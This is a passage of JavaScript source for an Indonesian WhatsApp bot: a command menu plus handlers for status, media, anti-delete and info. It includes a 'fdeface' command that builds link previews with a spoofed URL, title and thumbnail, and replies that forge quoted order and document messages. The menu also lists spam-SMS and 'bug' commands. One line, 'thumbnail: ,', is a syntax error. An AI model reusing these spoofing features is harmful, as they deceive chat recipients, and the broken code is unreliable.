\`\`\`│◪ ${no++}. ${prefix}fdeface\`\`\`
\`\`\`│◪ ${no++}. ${prefix}nuliskiri\`\`\`
\`\`\`│◪ ${no++}. ${prefix}nuliskanan\`\`\`
\`\`\`│◪ ${no++}. ${prefix}igstalk\`\`\`
\`\`\`│◪ ${no++}. ${prefix}lirik\`\`\`
\`\`\`│◪ ${no++}. ${prefix}mimpi\`\`\`
\`\`\`│◪ ${no++}. ${prefix}jadwaltv\`\`\`
\`\`\`│◪ ${no++}. ${prefix}tts\`\`\`
\`\`\`│◪ ${no++}. ${prefix}ttp\`\`\`
\`\`\`│◪ ${no++}. ${prefix}attp\`\`\`
\`\`\`│◪ ${no++}. ${prefix}emoji\`\`\`
\`\`\`│◪ ${no++}. ${prefix}simi\`\`\`
\`\`\`│◪ ${no++}. ${prefix}quotes\`\`\`
\`\`\`│◪ ${no++}. ${prefix}bikinquote\`\`\`
\`\`\`│◪ ${no++}. ${prefix}welcome\`\`\`
\`\`\`│◪ ${no++}. ${prefix}leveling\`\`\`
\`\`\`│◪ ${no++}. ${prefix}antilink\`\`\`
\`\`\`│◪ ${no++}. ${prefix}antibadword\`\`\`
\`\`\`│◪ ${no++}. ${prefix}antibule\`\`\`
\`\`\`│◪ ${no++}. ${prefix}getpict\`\`\`
\`\`\`│◪ ${no++}. ${prefix}getbio\`\`\`
\`\`\`│◪ ${no++}. ${prefix}getppgc\`\`\`
\`\`\`│◪ ${no++}. ${prefix}getdeskgc\`\`\`
\`\`\`│◪ ${no++}. ${prefix}group\`\`\`
\`\`\`│◪ ${no++}. ${prefix}admin\`\`\`
\`\`\`│◪ ${no++}. ${prefix}kontak\`\`\`
\`\`\`│◪ ${no++}. ${prefix}autosticker\`\`\`
\`\`\`│◪ ${no++}. ${prefix}kontag\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sticktag\`\`\`
\`\`\`│◪ ${no++}. ${prefix}imgtag\`\`\`
\`\`\`│◪ ${no++}. ${prefix}totag\`\`\`
\`\`\`│◪ ${no++}. ${prefix}ephemeral\`\`\`
\`\`\`│◪ ${no++}. ${prefix}creategroup\`\`\`
\`\`\`│◪ ${no++}. ${prefix}add\`\`\`
\`\`\`│◪ ${no++}. ${prefix}kick\`\`\`
\`\`\`│◪ ${no++}. ${prefix}afk\`\`\`
\`\`\`│◪ ${no++}. ${prefix}hidetag\`\`\`
\`\`\`│◪ ${no++}. ${prefix}level\`\`\`
\`\`\`│◪ ${no++}. ${prefix}linkgroup\`\`\`
\`\`\`│◪ ${no++}. ${prefix}antidelete\`\`\`
\`\`\`│◪ ${no++}. ${prefix}tagall\`\`\`
\`\`\`│◪ ${no++}. ${prefix}simih\`\`\`
\`\`\`│◪ ${no++}. ${prefix}setname\`\`\`
\`\`\`│◪ ${no++}. ${prefix}setdesc\`\`\`
\`\`\`│◪ ${no++}. ${prefix}demote\`\`\`
\`\`\`│◪ ${no++}. ${prefix}promote\`\`\`
\`\`\`│◪ ${no++}. ${prefix}fitnah\`\`\`
\`\`\`│◪ ${no++}. ${prefix}jadian\`\`\`
\`\`\`│◪ ${no++}. ${prefix}delete\`\`\`
\`\`\`│◪ ${no++}. ${prefix}mining\`\`\`
\`\`\`│◪ ${no++}. ${prefix}play\`\`\`
\`\`\`│◪ ${no++}. ${prefix}ytsearch\`\`\`
\`\`\`│◪ ${no++}. ${prefix}ytmp3\`\`\`
\`\`\`│◪ ${no++}. ${prefix}ytmp4\`\`\`
\`\`\`│◪ ${no++}. ${prefix}tiktok\`\`\`
\`\`\`│◪ ${no++}. ${prefix}tiktokaudio\`\`\`
\`\`\`│◪ ${no++}. ${prefix}igphoto\`\`\`
\`\`\`│◪ ${no++}. ${prefix}igvideo\`\`\`
\`\`\`│◪ ${no++}. ${prefix}joox\`\`\`
\`\`\`│◪ ${no++}. ${prefix}comictext\`\`\`
\`\`\`│◪ ${no++}. ${prefix}hekerlogo\`\`\`
\`\`\`│◪ ${no++}. ${prefix}graffiti\`\`\`
\`\`\`│◪ ${no++}. ${prefix}glowtext\`\`\`
\`\`\`│◪ ${no++}. ${prefix}covertext\`\`\`
\`\`\`│◪ ${no++}. ${prefix}narutotext\`\`\`
\`\`\`│◪ ${no++}. ${prefix}erodedtext\`\`\`
\`\`\`│◪ ${no++}. ${prefix}walltext\`\`\`
\`\`\`│◪ ${no++}. ${prefix}vietteltext\`\`\`
\`\`\`│◪ ${no++}. ${prefix}wingstext\`\`\`
\`\`\`│◪ ${no++}. ${prefix}halloween\`\`\`
\`\`\`│◪ ${no++}. ${prefix}graffiti2\`\`\`
\`\`\`│◪ ${no++}. ${prefix}graffiti3\`\`\`
\`\`\`│◪ ${no++}. ${prefix}foiltext\`\`\`
\`\`\`│◪ ${no++}. ${prefix}bloodtext\`\`\`
\`\`\`│◪ ${no++}. ${prefix}hekertext\`\`\`
\`\`\`│◪ ${no++}. ${prefix}bokehtext\`\`\`
\`\`\`│◪ ${no++}. ${prefix}carbontext\`\`\`
\`\`\`│◪ ${no++}. ${prefix}avengerstext\`\`\`
\`\`\`│◪ ${no++}. ${prefix}watertext\`\`\`
\`\`\`│◪ ${no++}. ${prefix}firetext\`\`\`
\`\`\`│◪ ${no++}. ${prefix}metaltext\`\`\`
\`\`\`│◪ ${no++}. ${prefix}ballontext\`\`\`
\`\`\`│◪ ${no++}. ${prefix}gemboktext\`\`\`
\`\`\`│◪ ${no++}. ${prefix}bannerff\`\`\`
\`\`\`│◪ ${no++}. ${prefix}aloklogo\`\`\`
\`\`\`│◪ ${no++}. ${prefix}miyalogo\`\`\`
\`\`\`│◪ ${no++}. ${prefix}gamelogo\`\`\`
\`\`\`│◪ ${no++}. ${prefix}blackpink\`\`\`
\`\`\`│◪ ${no++}. ${prefix}thundername\`\`\`
\`\`\`│◪ ${no++}. ${prefix}silktext\`\`\`
\`\`\`│◪ ${no++}. ${prefix}partytext\`\`\`
\`\`\`│◪ ${no++}. ${prefix}romancetext\`\`\`
\`\`\`│◪ ${no++}. ${prefix}googletext\`\`\`
\`\`\`│◪ ${no++}. ${prefix}glowtext2\`\`\`
\`\`\`│◪ ${no++}. ${prefix}lovemessage\`\`\`
\`\`\`│◪ ${no++}. ${prefix}glitchtext\`\`\`
\`\`\`│◪ ${no++}. ${prefix}galaxytext\`\`\`
\`\`\`│◪ ${no++}. ${prefix}pornhub\`\`\`
\`\`\`│◪ ${no++}. ${prefix}tahta\`\`\`
\`\`\`│◪ ${no++}. ${prefix}wetglass\`\`\`
\`\`\`│◪ ${no++}. ${prefix}stylelogo\`\`\`
\`\`\`│◪ ${no++}. ${prefix}watercolor\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertiharam\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertibabu\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertibucin\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertibocilff\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertigay\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertipacar\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertisadboy\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertisurga\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertipinter\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertibadboy\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertibadgirl\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertigoodgirl\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertigoodboy\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertieditor\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertigudluking\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertipakboy\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertijamet\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertiyutub\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertiheker\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertiff1\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertiff2\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertiff3\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertiff4\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertiff5\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertipubg1\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertipubg2\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sertiml\`\`\`
\`\`\`│◪ ${no++}. ${prefix}tebakgambar\`\`\`
\`\`\`│◪ ${no++}. ${prefix}caklontong\`\`\`
\`\`\`│◪ ${no++}. ${prefix}bisakah\`\`\`
\`\`\`│◪ ${no++}. ${prefix}kapankah\`\`\`
\`\`\`│◪ ${no++}. ${prefix}apakah\`\`\`
\`\`\`│◪ ${no++}. ${prefix}spam\`\`\`
\`\`\`│◪ ${no++}. ${prefix}tag\`\`\`
\`\`\`│◪ ${no++}. ${prefix}chat\`\`\`
\`\`\`│◪ ${no++}. ${prefix}surat\`\`\`
\`\`\`│◪ ${no++}. ${prefix}slot\`\`\`
\`\`\`│◪ ${no++}. ${prefix}xox\`\`\`
\`\`\`│◪ ${no++}. ${prefix}rate\`\`\`
\`\`\`│◪ ${no++}. ${prefix}hobby\`\`\`
\`\`\`│◪ ${no++}. ${prefix}truth\`\`\`
\`\`\`│◪ ${no++}. ${prefix}dare\`\`\`
\`\`\`│◪ ${no++}. ${prefix}cekbapak\`\`\`
\`\`\`│◪ ${no++}. ${prefix}seberapagay\`\`\`
\`\`\`│◪ ${no++}. ${prefix}gachacewek\`\`\`
\`\`\`│◪ ${no++}. ${prefix}gachacowok\`\`\`
\`\`\`│◪ ${no++}. ${prefix}sagiri\`\`\`
\`\`\`│◪ ${no++}. ${prefix}megumin\`\`\`
\`\`\`│◪ ${no++}. ${prefix}waifu\`\`\`
\`\`\`│◪ ${no++}. ${prefix}neko\`\`\`
\`\`\`│◪ ${no++}. ${prefix}shinobu\`\`\`
\`\`\`│◪ ${no++}. ${prefix}loli\`\`\`
\`\`\`│◪ ${no++}. ${prefix}nekonime\`\`\`
\`\`\`│◪ ${no++}. ${prefix}darkjokes\`\`\`
\`\`\`│◪ ${no++}. ${prefix}meme\`\`\`
\`\`\`│◪ ${no++}. ${prefix}estetik\`\`\`
\`\`\`│◪ ${no++}. ${prefix}limit\`\`\`
\`\`\`│◪ ${no++}. ${prefix}transfer\`\`\`
\`\`\`│◪ ${no++}. ${prefix}atm\`\`\`
\`\`\`│◪ ${no++}. ${prefix}buylimit\`\`\`
\`\`\`│◪ ${no++}. ${prefix}premiumlist\`\`\`
\`\`\`│◪ ${no++}. ${prefix}tomp3\`\`\`
\`\`\`│◪ ${no++}. ${prefix}tomp4\`\`\`
\`\`\`│◪ ${no++}. ${prefix}toimg\`\`\`
\`\`\`│◪ ${no++}. ${prefix}toptt\`\`\`
\`\`\`│◪ ${no++}. ${prefix}detikvn\`\`\`
\`\`\`│◪ ${no++}. ${prefix}detikvideo\`\`\`
\`\`\`│◪ ${no++}. ${prefix}imgtourl\`\`\`
\`\`\`│◪ ${no++}. ${prefix}bitly\`\`\`
\`\`\`│◪ ${no++}. ${prefix}trigered\`\`\`
\`\`\`│◪ ${no++}. ${prefix}komenyt\`\`\`
\`\`\`│◪ ${no++}. ${prefix}volume\`\`\`
\`\`\`│◪ ${no++}. ${prefix}nightcore\`\`\`
\`\`\`│◪ ${no++}. ${prefix}slow\`\`\`
\`\`\`│◪ ${no++}. ${prefix}tupai\`\`\`
\`\`\`│◪ ${no++}. ${prefix}blub\`\`\`
\`\`\`│◪ ${no++}. ${prefix}gemuk\`\`\`
\`\`\`│◪ ${no++}. ${prefix}ghost\`\`\`
\`\`\`│◪ ${no++}. ${prefix}bass\`\`\`
\`\`\`│◪ ${no++}. ${prefix}mutual\`\`\`
\`\`\`│◪ ${no++}. ${prefix}next\`\`\`
\`\`\`│◪ ${no++}. ${prefix}lacakip\`\`\`
\`\`\`│◪ ${no++}. ${prefix}dorking\`\`\`
\`\`\`│◪ ${no++}. ${prefix}brainly\`\`\`
\`\`\`│◪ ${no++}. ${prefix}wiki\`\`\`
\`\`\`│◪ ${no++}. ${prefix}kbbi\`\`\`
\`\`\`│◪ ${no++}. ${prefix}covid\`\`\`
\`\`\`│◪ ${no++}. ${prefix}pinterest\`\`\`
\`\`\`│◪ ${no++}. ${prefix}jadwalsholat\`\`\`
\`\`\`│◪ ${no++}. ${prefix}spamsms\`\`\`
\`\`\`│◪ ${no++}. ${prefix}addstiker\`\`\`
\`\`\`│◪ ${no++}. ${prefix}getstiker\`\`\`
\`\`\`│◪ ${no++}. ${prefix}liststiker\`\`\`
\`\`\`│◪ ${no++}. ${prefix}addvideo\`\`\`
\`\`\`│◪ ${no++}. ${prefix}getvideo\`\`\`
\`\`\`│◪ ${no++}. ${prefix}listvideo\`\`\`
\`\`\`│◪ ${no++}. ${prefix}addvn\`\`\`
\`\`\`│◪ ${no++}. ${prefix}getvn\`\`\`
\`\`\`│◪ ${no++}. ${prefix}listvn\`\`\`
\`\`\`│◪ ${no++}. ${prefix}addimage\`\`\`
\`\`\`│◪ ${no++}. ${prefix}getimage\`\`\`
\`\`\`│◪ ${no++}. ${prefix}listimage\`\`\`
\`\`\`│◪ ${no++}. ${prefix}addprem\`\`\`
\`\`\`│◪ ${no++}. ${prefix}dellprem\`\`\`
\`\`\`│◪ ${no++}. ${prefix}addrespon\`\`\`
\`\`\`│◪ ${no++}. ${prefix}delrespon\`\`\`
\`\`\`│◪ ${no++}. ${prefix}ban\`\`\`
\`\`\`│◪ ${no++}. ${prefix}colong\`\`\`
\`\`\`│◪ ${no++}. ${prefix}unban\`\`\`
\`\`\`│◪ ${no++}. ${prefix}addbadword\`\`\`
\`\`\`│◪ ${no++}. ${prefix}delbadword\`\`\`
\`\`\`│◪ ${no++}. ${prefix}badwordlist\`\`\`
\`\`\`│◪ ${no++}. ${prefix}bc\`\`\`
\`\`\`│◪ ${no++}. ${prefix}bug\`\`\`
\`\`\`│◪ ${no++}. ${prefix}hacked\`\`\`
\`\`\`│◪ ${no++}. ${prefix}self\`\`\`
\`\`\`│◪ ${no++}. ${prefix}public\`\`\`
\`\`\`│◪ ${no++}. ${prefix}leave\`\`\`
\`\`\`│◪ ${no++}. ${prefix}delchatgc\`\`\`
\`\`\`│◪ ${no++}. ${prefix}delttc\`\`\`
\`\`\`│◪ ${no++}. ${prefix}upswteks\`\`\`
\`\`\`│◪ ${no++}. ${prefix}upswimage\`\`\`
\`\`\`│◪ ${no++}. ${prefix}upswvideo\`\`\`
\`\`\`│◪ ${no++}. ${prefix}shutdown\`\`\`
\`\`\`│◪ ${no++}. ${prefix}setreply\`\`\`
\`\`\`│◪ ${no++}. ${prefix}setprefix\`\`\`
\`\`\`│◪ ${no++}. ${prefix}setbio\`\`\`
\`\`\`│◪ ${no++}. ${prefix}setppbot\`\`\`
\`\`\`│◪ ${no++}. ${prefix}setnamebot\`\`\`
\`\`\`│◪ ${no++}. ${prefix}setthumb\`\`\`
\`\`\`│◪ ${no++}. ${prefix}clearall\`\`\`
\`\`\`│◪ ${no++}. ${prefix}resetlimit\`\`\`
\`\`\`│◪ ${no++}. ${prefix}event\`\`\`
\`\`\`│◪ ${no++}. ${prefix}term\`\`\`
\`\`\`│◪ ${no++}. ${prefix}return\`\`\`
\`\`\`│◪ ${no++}. ${prefix}readall\`\`\`
\`\`\`└─❏「 ${pushname} 」\`\`\``
dila.sendMessage(from, menuall, text, { thumbnail: dnsnew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./src/image/thumbnail.jpeg'), surface: 200, message: `All Menu`, orderTitle: `All Menu`, sellerJid: '0@s.whatsapp.net'}}}})
break
case 'tutorial':
case 'tumtor':
case 'script':
case 'bot':
dentod = "6285866295942@s.whatsapp.net"
tumtor = `*_TUTORIAL BUAT BOT_*

*1. Download Apk Termux*
*2. Download Script Bot (link dibawah)*
*3. Ekstrak Filenya Ke SDcard*
*4. Ketik Perintah Berikut Di Termux:*
*$ termux-setup-storage (izinkan)*
*$ pkg update && pkg upgrade*
*$ pkg install git*
*$ cd /sdcard*
*$ mv dnsnew $HOME*
*$ cd*
*$ cd dnsnew*
*$ bash install.sh*
*$ npm start*
*5. Tinggal Scan Kode QRnya (done)*

*Link Sc :*
*https://www.mediafire.com/file/mmrf3f1plepugkg/kont.zip/file*

*Instagram :*
*https://instagram.com/denssptraa*

*YouTube :*
*https://youtube.com/channel/UCdAlsvg9B6llWCWV8JMNhug*

*Pw File Botnya :*
*https://wa.me/6285866295942*

*Untuk Ganti Nama Bot, Owner. Dll*
*Ada Di Folder dns/setting.json*

*_© Powered By @${dentod.split('@')[0]}_*`
dila.sendMessage(from, tumtor, text, { thumbnail: dnsnew, sendEphemeral: true, quoted: Lan, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, remoteJid: "6283136505591-1614953337@g.us", id: "B391837A58338BA8186C47E51FFDFD4A" }, message: { documentMessage: { 'jpegThumbnail': fs.readFileSync("./src/image/thumbnail.jpeg"), mimetype: "application/octet-stream",title: "dnsnew.zip", fileLength: "36", pageCount: 0, fileName: "dnsnew.zip"}}, messageTimestamp: "1614069378", status: "PENDING"}, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [dentod]}})
break
case 'status':
case 'stats':
				var groups = dila.chats.array.filter(v => v.jid.endsWith('g.us'))
				var privat = dila.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
				var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
					uptime = process.uptime();
					const timestamp = speed();
					const totalChat = await dila.chats.all()
					var charge = charging ? 'true' : 'false'
					var listrik = charging ? 'Dicas' : 'Tidak Dicas'
					const latensi = speed() - timestamp
					var total = math(`${groups.length} ${privat.length}`)
					stamtus = `\`\`\`─────「 STATUS 」─────\`\`\`

\`\`\`Private Chat : ${privat.length}\`\`\`
\`\`\`Group Chat : ${groups.length}\`\`\`
\`\`\`Total Chat : ${totalChat.length}\`\`\`
\`\`\`Speed : ${latensi.toFixed(4)} Second\`\`\`
\`\`\`Runtime : ${kyun(uptime)}\`\`\`
\`\`\`Baterai : ${JSON.stringify(baterai)}% - ${listrik}\`\`\`
\`\`\`Status : ${self ? 'Self' : 'Public'}\`\`\`
\`\`\`Penggunaan Ram : ${ram2}\`\`\`
\`\`\`Platform : ${os.platform()}\`\`\`
\`\`\`Hostname : ${os.hostname()}\`\`\`
\`\`\`Uptime : ${kyun(os.uptime())}\`\`\`
\`\`\`Device Model: ${dila.user.phone.device_model}\`\`\`
\`\`\`Wa Version: ${dila.user.phone.wa_version}\`\`\`
\`\`\`Os Version: ${dila.user.phone.os_version}\`\`\`

\`\`\`─────「 ${botName} 」─────\`\`\``
dila.sendMessage(from, stamtus, text, { thumbnail: dnsnew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./src/image/thumbnail.jpeg'), surface: 200, message: cr, orderTitle: cr, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
break
case 'detikvn':
if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(media)
						dila.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:Lan})
						fs.unlinkSync(media)
				break
				case 'detikvideo':
				if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(media)
						dila.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: Lan})
						fs.unlinkSync(media)
				break
			  case 'fdeface':
if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					var nn = body.slice(9)
                                var urlnye = nn.split("|")[0];
                                var titlenye = nn.split("|")[1];
                                var descnye = nn.split("|")[2];
                                imgbbb = require('imgbb-uploader')
                                run = getRandom('.jpeg')
                                encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
                                media = await dila.downloadAndSaveMediaMessage(encmedia)
                                ddatae = await imageToBase64(JSON.stringify(media).replace(/\"/gi, ''))
                                dila.sendMessage(from, {
                                        text: `${urlnye}`,
                                        matchedText: `${urlnye}`,
                                        canonicalUrl: `${urlnye}`,
                                        description: `${descnye}`,
                                        title: `${titlenye}`,
                                        jpegThumbnail: ddatae
                                }, 'extendedTextMessage', { detectLinks: false })
                                break
                break
               case 'afk':
	                if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
	                if (!isGroup) return reply(dla.groupo())
                    alasan = args.join(" ")
                    afk[sender.split('@')[0]] = alasan.toLowerCase()
                    fs.writeFileSync("./database/afk.json", JSON.stringify(afk))
                    ini_txt = `\`\`\`Fitur Afk berhasil diaktifkan!\`\`\`\n\`\`\`Username:\`\`\` ${pushname}\n`
                    if (alasan != "") {
                        ini_txt += "\`\`\`Alasan:\`\`\` " + alasan
                    }
                    reply(ini_txt)
                    break
	            break
	case 'owner':
	  case 'creator':
	                dila.sendMessage(from, { displayname: mem, vcard: vcard}, MessageType.contact, { quoted: {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})},message: {"imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": `${ownerName}\nIg : ${igName}\nYt : ${ytName}`,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync("./src/image/thumbnail.jpeg"),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}})
							dila.sendMessage(from, `Tuh Nomor Owner ${botName} , Jangan Lupa Disave -^`, MessageType.text, { quoted: Lan })
        break
	case 'antidelete':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
			    const dataRevoke = JSON.parse(fs.readFileSync('./src/gc-revoked.json'))
                const dataCtRevoke = JSON.parse(fs.readFileSync('./src/ct-revoked.json'))
                const dataBanCtRevoke = JSON.parse(fs.readFileSync('./src/ct-revoked-banlist.json'))
                const isRevoke = dataRevoke.includes(from)
                const isCtRevoke = dataCtRevoke.data
                const isBanCtRevoke = dataBanCtRevoke.includes(sender) ? true : false
                const argz = body.split(' ')
                if (argz.length === 1) return dila.sendMessage(from, `Penggunaan fitur antidelete :\n\n*${prefix}antidelete [aktif/mati]* (Untuk grup)\n*${prefix}antidelete [ctaktif/ctmati]* (untuk semua kontak)\n*${prefix}antidelete banct 628558xxxxxxx* (banlist kontak)`, MessageType.text)
                if (argz[1] == 'aktif') {
                	if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
                    if (isGroup) {
                    if (isRevoke) return dila.sendMessage(from, `Antidelete telah diaktifkan di grup ini sebelumnya!`, MessageType.text)
                        dataRevoke.push(from)
                        fs.writeFileSync('./src/gc-revoked.json', JSON.stringify(dataRevoke, null, 2))
                        dila.sendMessage(from, `*Succes Enable Antidelete Grup!*`, MessageType.text)
                    } else if (!isGroup) {
                        dila.sendMessage(from, `Untuk kontak penggunaan *${prefix}antidelete ctaktif*`, MessageType.text)
                    }
                } else if (argz[1] == 'ctaktif') {
                	if (!isOwner) return reply(dla.ownerb())
                    if (!isGroup) {
                    if (isCtRevoke) return dila.sendMessage(from, `Antidelete telah diaktifkan di semua kontak sebelumnya!`, MessageType.text)
                        dataCtRevoke.data = true
                        fs.writeFileSync('./src/ct-revoked.json', JSON.stringify(dataCtRevoke, null, 2))
                        dila.sendMessage(from, `Antidelete diaktifkan disemua kontak!`, MessageType.text)
                    } else if (isGroup) {
                        dila.sendMessage(from, `Untuk grup penggunaan *${prefix}antidelete aktif*`, MessageType.text)
                    }
                } else if (argz[1] == 'banct') {
                	if (!isOwner) return reply(dla.ownerb())
                    if (isBanCtRevoke) return dila.sendMessage(from, `kontak ini telah ada di database banlist!`, MessageType.text)
                    if (argz.length === 2 || argz[2].startsWith('0')) return dila.sendMessage(from, `Masukan nomer diawali dengan 62! contoh 62859289xxxxx`, MessageType.text)
                    dataBanCtRevoke.push(argz[2] + '@s.whatsapp.net')
                    fs.writeFileSync('./src/ct-revoked-banlist.json', JSON.stringify(dataBanCtRevoke, null, 2))
                    dila.sendMessage(from, `Kontak ${argz[2]} telah dimasukan ke banlist antidelete secara permanen!`, MessageType.text)
                } else if (argz[1] == 'mati') {
                	if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
                	if (isGroup) {
                	    const index = dataRevoke.indexOf(from)
                        dataRevoke.splice(index, 1)
                        fs.writeFileSync('./src/gc-revoked.json', JSON.stringify(dataRevoke, null, 2))
                        dila.sendMessage(from, `*Succes disable Antidelete Grup!*`, MessageType.text)
                    } else if (!isGroup) {
                        dila.sendMessage(from, `Untuk kontak penggunaan *${prefix}antidelete ctmati*`, MessageType.text)
                    }
                } else if (argz[1] == 'ctmati') {
                	if (!isOwner) return reply(dla.ownerb())
                    if (!isGroup) {
                        dataCtRevoke.data = false
                        fs.writeFileSync('./src/ct-revoked.json', JSON.stringify(dataCtRevoke, null, 2))
                        dila.sendMessage(from, `Antidelete dimatikan disemua kontak!`, MessageType.text)
                    } else if (isGroup) {
                        dila.sendMessage(from, `Untuk grup penggunaan *${prefix}antidelete mati*`, MessageType.text)
                    }
                }
                break
				case 'donasi':
				case 'donate':
				dila.sendMessage(from, dla.donasi(), text, { quoted: Lan })
					break
				case 'iklan':
				dila.sendMessage(from, dla.iklan(botName, ownerNumber, ownerName), text, { quoted: Lan })
					break

				case 'speed':
				case 'ping':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					const timestampt = speed();
					const latensid = speed() - timestampt
					fakestatus(`Speed: ${latensid.toFixed(4)} _ms_`)
					break
				case 'runtime':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					runtime = process.uptime()
					runte = `「 *RUNTIME* 」\n${kyun(runtime)}`
					fakestatus(`${runte}`)
					break
					
					case 'info':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
				    anu = process.uptime()
					mee = dila.user
					ca = totalchat
					inponya = `┌❏「 *_Info_* 」
│
│┌◪ \`\`\`Sc Ori By\`\`\`
│├◪ *(Ramlan ID)*
││
│├◪ \`\`\`Collab With\`\`\`
│├◪ *(Arifi Razzaq & Manik*)
││
│├◪ \`\`\`Slot , Xox By\`\`\`
│└◪ *(Anker Production)*
│
├❏「 *_Social Media_* 」
│
│┌◪ \`\`\`Group Bot\`\`\`
│├◪ *${grupLink}*
││
│├◪ \`\`\`YouTube\`\`\`
│├◪ *${ytLink}*
││
│├◪ \`\`\`Instagram\`\`\`
│└◪ *${igLink}*
│
├❏「 *_Thx To_* 」
│
│┌◪ \`\`\`Ramlan ID\`\`\`
│├◪ \`\`\`Arifi Razzaq\`\`\`
│├◪ \`\`\`Denis Putra\`\`\`
│├◪ \`\`\`Dila\`\`\`
│├◪ \`\`\`Anker Production\`\`\`
│├◪ \`\`\`Ivan-MLN\`\`\`
│├◪ \`\`\`Rvan\`\`\`
│├◪ \`\`\`Hans\`\`\`
│├◪ \`\`\`Hazn\`\`\`
│├◪ \`\`\`Aqul\`\`\`
│├◪ \`\`\`MrG3P5\`\`\`
│├◪ \`\`\`MrHRTZ\`\`\`
│├◪ \`\`\`Nafiz\`\`\`
│├◪ \`\`\`Itsmeiky\`\`\`
│├◪ \`\`\`DuingZ\`\`\`
│├◪ \`\`\`Arga\`\`\`
│├◪ \`\`\`Nayla\`\`\`
│├◪ \`\`\`Fadhil\`\`\`
│├◪ \`\`\`Adiwajshing/Baileys\`\`\`
│├◪ \`\`\`MhankBarBar\`\`\`
│├◪ \`\`\`SlavyanDesu\`\`\`
│└◪ \`\`\`Penyedia API\`\`\`
│
└「 *_${botName}_* 」`
				dila.sendMessage(from, dnsnew, image, { quoted: { key:{ fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "locationMessage": { "name":cr,"h": cr, 'jpegThumbnail': fs.readFileSync("./src/image/thumbnail.jpeg")}}}, thumbnail: , contextInfo: { forwardingScore: 508, isForwarded: true }, caption: inponya })
break
				case 'simplemenu':
				case 'simpelmenu':
					if (isBanned) return reply(dla.baned())
